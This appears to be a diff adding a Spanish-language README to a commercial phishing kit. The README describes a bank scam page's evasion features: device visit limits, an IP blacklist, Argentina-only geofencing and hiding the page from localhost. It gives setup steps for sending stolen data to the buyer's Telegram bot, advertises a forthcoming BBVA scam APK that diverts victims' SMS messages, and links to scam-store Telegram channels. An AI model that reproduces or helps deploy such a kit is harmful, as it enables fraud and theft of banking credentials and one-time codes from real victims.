@@ -1,0 +1,36 @@
+////////////////////////////////////////////////
+
+
+Nuevas Funciones
+
+Limite de visitas por dispositivo 2 [Ojo solo puede ver la pagina 2 veses por cada movil para evitar que manden tantas cuentas falsa la misma persona]
+
+Verificacion de Ip en lsita Negra
+
+Filtrado de Pais {El scam solo se vera si entra desde argentina} o una ip argentina 
+
+No se muestra desde local host " Solo se muestra montado en el servidor online "
+
+
+////////////////////////////////////////////////
+
+
+Pronto Estara en venta una apk Scam de BBVA con desvio de sms [Osea los Mensajes que lleguen a bandeja de entrada de la victima se te enviaran a ti a telegram
+ aun esta en fase de prueba]
+Tendria un precio inicial de 1000 Usdt
+
+
+Agregar su id y el token de su bot en el archibo bot.php
+
+Abra la carpeta ./joe  luego abra el archibo bot.php ingrese su token y su id
+
+Luego suba el scam y pruebelo
+
+Contactarme
+
+////////////////////////////////
+Grupo --https://t.me/scam_store
+Canal --https://t.me/scam_store_canal
+///////////////////////////////
+Personal --https:/t.me/jbriden          
+
